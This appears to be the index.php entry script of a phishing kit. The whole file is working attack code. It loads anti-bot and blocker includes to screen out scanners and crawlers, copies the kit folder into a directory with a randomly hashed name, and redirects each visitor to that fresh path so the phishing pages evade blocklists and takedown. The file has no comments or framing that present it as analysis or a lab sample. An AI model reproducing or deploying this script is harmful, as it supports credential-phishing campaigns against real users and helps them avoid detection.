<?php
/*
* index.php
*/
require_once '1/hostname_check.php'; // Check if hostname contain blocked word
require_once 'bots.php';
require_once 'blocker.php';
require_once 'blk.php';
require_once 'antibots.php';
require_once 'bt.php';


$random=rand(0,100000000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="1";
recurse_copy( $src, $dst );
header("location:$dst");


?>
